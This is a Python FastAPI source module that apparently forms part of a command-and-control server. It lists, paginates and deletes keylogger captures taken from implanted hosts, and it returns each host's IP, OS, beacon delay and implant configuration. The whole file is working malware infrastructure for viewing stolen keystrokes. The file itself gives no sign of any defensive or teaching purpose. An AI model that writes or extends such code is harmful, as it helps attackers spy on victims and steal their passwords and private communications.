from fastapi.responses import JSONResponse
from logic.conclude_logic import conclude_request
from infra.database.database import Host, Keylogger, sqlite_db
from .search import filter_rows
from .pagination import slice_page


async def list_keylogger(body):
    rows = await sqlite_db.read(Keylogger, order_desc_id=True)
    hosts = await sqlite_db.read(Host)
    host_map = {h.tag: h.hostname for h in hosts if h.tag}
    rows = await filter_rows(rows, body, host_map)
    items = [
        {
            "tag": r.tag,
            "hora": r.created_at.strftime("%Y/%m/%d - %H:%M") if r.created_at else "",
            "hostTag": r.host_tag,
            "host": host_map.get(r.host_tag, r.host_tag),
            "content": r.content,
        }
        for r in rows
    ]
    content, total, page, page_size = await slice_page(items, body)
    return JSONResponse(
        content={
            "status": "success",
            "content": content,
            "hosts": [
                {
                    "id": h.id,
                    "tag": h.tag,
                    "ip": h.ip,
                    "os": h.os,
                    "first_seen": h.first_seen.isoformat() if h.first_seen else None,
                    "last_seen": h.last_seen.isoformat() if h.last_seen else None,
                    "delay": h.delay,
                    "implant_config": h.implant_config,
                }
                for h in hosts
            ],
            "total": total,
            "page": page,
            "pageSize": page_size,
        }
    )


async def fetch_keylogger(query):
    body = query.model_dump() if hasattr(query, "model_dump") else query
    return await conclude_request(await list_keylogger(body), type="keylogger")


async def remove_keylogger(tag: str):
    if not await sqlite_db.read(Keylogger, tag=tag):
        return JSONResponse(status_code=404, content={"status": "failure", "message": "Not found"})
    await sqlite_db.delete(Keylogger, tag=tag)
    return JSONResponse(content={"status": "success", "message": "Removed"})


async def delete_keylogger_route(tag: str):
    return await conclude_request(await remove_keylogger(tag), type="keylogger")
